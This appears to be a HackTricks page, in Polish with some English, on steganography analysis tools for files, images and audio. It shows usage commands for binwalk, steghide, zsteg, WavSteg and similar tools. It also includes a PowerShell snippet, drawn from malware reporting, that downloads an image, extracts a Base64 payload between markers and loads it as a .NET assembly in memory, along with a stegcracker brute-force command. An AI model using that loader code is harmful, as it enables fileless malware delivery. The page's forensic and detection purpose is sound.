# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Wyodrębnianie danych z plików**

### **Binwalk**

Narzędzie do przeszukiwania plików binarnych w poszukiwaniu osadzonych ukrytych plików i danych. Jest instalowane za pomocą `apt`, a jego źródło jest dostępne na [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Odzyskuje pliki na podstawie ich nagłówków i stopek — przydatne w przypadku obrazów png. Instalowany za pomocą `apt`, źródła na [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Służy do przeglądania metadanych plików, dostępny [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Podobny do exiftool, służy do przeglądania metadanych. Instalowalny przez `apt`, kod źródłowy na [GitHub](https://github.com/Exiv2/exiv2), i posiada [oficjalną stronę](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Określ typ pliku, z którym masz do czynienia.

### **Strings**

Wydobywa czytelne ciągi znaków z plików, używając różnych ustawień kodowania do filtrowania wyjścia.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Porównanie (cmp)**

Przydatne do porównywania zmodyfikowanego pliku z jego oryginalną wersją znalezioną online.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Wyodrębnianie ukrytych danych w tekście**

### **Ukryte dane w odstępach**

Niewidoczne znaki w pozornie pustych odstępach mogą ukrywać informacje. Aby wyodrębnić te dane, odwiedź [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Wyodrębnianie danych z obrazów**

### **Identyfikacja szczegółów obrazu za pomocą GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) służy do określania typów plików obrazów i identyfikowania potencjalnych uszkodzeń. Wykonaj poniższe polecenie, aby zbadać obraz:
```bash
./magick identify -verbose stego.jpg
```
Aby spróbować naprawić uszkodzony obraz, dodanie komentarza do metadanych może pomóc:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide do ukrywania danych**

Steghide umożliwia ukrywanie danych w plikach `JPEG, BMP, WAV i AU`, potrafi osadzać i wydobywać zaszyfrowane dane. Instalacja jest prosta przy użyciu `apt`, a [kod źródłowy jest dostępny na GitHubie](https://github.com/StefanoDeVuono/steghide).

**Polecenia:**

- `steghide info file` ujawnia, czy plik zawiera ukryte dane.
- `steghide extract -sf file [--passphrase password]` wydobywa ukryte dane, hasło opcjonalne.

Do ekstrakcji przez przeglądarkę odwiedź [tę stronę](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Aby spróbować złamać hasło do Steghide, użyj [stegcracker](https://github.com/Paradoxis/StegCracker.git) w następujący sposób:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg dla plików PNG i BMP**

zsteg specjalizuje się w odkrywaniu ukrytych danych w plikach PNG i BMP. Instalacja odbywa się przez `gem install zsteg`, z jego [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` stosuje wszystkie metody wykrywania na pliku.
- `zsteg -E file` określa payload dla ekstrakcji danych.

### **StegoVeritas and Stegsolve**

**stegoVeritas** sprawdza metadane, wykonuje transformacje obrazu i stosuje LSB brute forcing, między innymi funkcjami. Użyj `stegoveritas.py -h` dla pełnej listy opcji i `stegoveritas.py stego.jpg` aby wykonać wszystkie kontrole.

**Stegsolve** stosuje różne filtry kolorów, aby ujawnić ukryte teksty lub wiadomości w obrazach. Jest dostępny na [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) techniques mogą ujawnić ukrytą zawartość w obrazach. Przydatne zasoby to:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy umożliwia osadzanie informacji w plikach obrazów i audio, obsługując formaty takie jak PNG, BMP, GIF, WebP i WAV. Jest dostępny na [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Aby analizować pliki PNG lub zweryfikować ich autentyczność, użyj:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Dodatkowe narzędzia do analizy obrazów**

W celu dalszej eksploracji rozważ odwiedzenie:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Ładunki Base64 oddzielone markerami ukryte w obrazach (malware delivery)

Commodity loaders coraz częściej ukrywają ładunki zakodowane w Base64 jako zwykły tekst wewnątrz w przeciwnym razie prawidłowych obrazów (często GIF/PNG). Zamiast manipulacji LSB na poziomie pikseli, ładunek jest ograniczony unikalnymi ciągami markerów początkowych/końcowych osadzonymi w tekście/metadanych pliku. Następnie PowerShell stager:

- Pobiera obraz przez HTTP(S)
- Znajduje ciągi markerów (zaobserwowane przykłady: <<sudo_png>> … <<sudo_odt>>)
- Wyciąga tekst między markerami i Base64-dekoduje go do bajtów
- Ładuje .NET assembly w pamięci i wywołuje znaną metodę wejściową (nie zapisuje pliku na dysku)

Minimalny PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notatki
- This falls under ATT&CK T1027.003 (steganography). Ciągi markerów różnią się między kampaniami.
- Hunting: skanuj pobrane obrazy pod kątem znanych separatorów; oznacz `PowerShell` używając `DownloadString`, a następnie `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Ekstrakcja danych z plików audio**

**Audio steganography** oferuje unikalną metodę ukrywania informacji w plikach dźwiękowych. Różne narzędzia są wykorzystywane do osadzania lub odzyskiwania ukrytych danych.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide jest wszechstronnym narzędziem zaprojektowanym do ukrywania danych w plikach JPEG, BMP, WAV i AU. Szczegółowe instrukcje znajdują się w [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

To narzędzie obsługuje wiele formatów, w tym PNG, BMP, GIF, WebP i WAV. Po więcej informacji odnieś się do [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg jest istotny przy ocenie integralności plików audio, ujawniając szczegółowe informacje i wskazując ewentualne niezgodności.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg doskonale nadaje się do ukrywania i wydobywania danych w plikach WAV za pomocą metody najmniej znaczącego bitu. Jest dostępny na [GitHub](https://github.com/ragibson/Steganography#WavSteg). Dostępne polecenia:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound umożliwia szyfrowanie i wykrywanie informacji w plikach dźwiękowych przy użyciu AES-256. Można go pobrać ze [strony oficjalnej](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Niezastąpione narzędzie do wizualnej i analitycznej inspekcji plików audio — Sonic Visualizer potrafi ujawnić ukryte elementy niewykrywalne innymi metodami. Odwiedź [oficjalną stronę](https://www.sonicvisualiser.org/) po więcej.

### **DTMF Tones - Dial Tones**

Wykrywanie tonów DTMF w plikach audio można przeprowadzić za pomocą narzędzi online, takich jak [ten detektor DTMF](https://unframework.github.io/dtmf-detect/) oraz [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Dane binarne, dla których pierwiastek kwadratowy długości jest liczbą całkowitą, mogą reprezentować kod QR. Użyj tego fragmentu, aby to sprawdzić:
```python
import math
math.sqrt(2500) #50
```
Dla konwersji binarnych danych na obraz sprawdź [dcode](https://www.dcode.fr/binary-image). Do odczytu kodów QR użyj [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Tłumaczenie Braille'a**

Do tłumaczenia Braille'a świetnym źródłem jest [Branah Braille Translator](https://www.branah.com/braille-translator).

## **Źródła**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
